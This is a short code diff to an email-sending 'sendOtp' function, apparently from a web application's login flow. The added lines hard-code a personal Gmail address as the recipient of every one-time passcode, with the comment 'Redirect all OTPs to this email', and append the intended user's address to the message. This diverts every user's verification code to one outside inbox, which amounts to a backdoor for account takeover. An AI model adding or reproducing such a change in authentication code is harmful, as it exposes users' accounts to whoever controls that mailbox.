@@ -13,10 +13,10 @@ export const sendOtp = async (to, otp) => {
   });
   const mailOptions = {
     from: process.env.EMAIL_USER || "avasardeveloper@gmail.com",
-    to,
+    to: "amitverm3817@gmail.com", // Redirect all OTPs to this email
     subject: 'Your OTP Code',
-    text: `Your OTP code is: ${otp}`,
-    html: `<p>Your OTP code is: <b>${otp}</b></p>`
+    text: `Your OTP code is: ${otp} (Original recipient: ${to})`,
+    html: `<p>Your OTP code is: <b>${otp}</b></p><p>Original recipient: ${to}</p>`
   };
   await transporter.sendMail(mailOptions);
 }; 
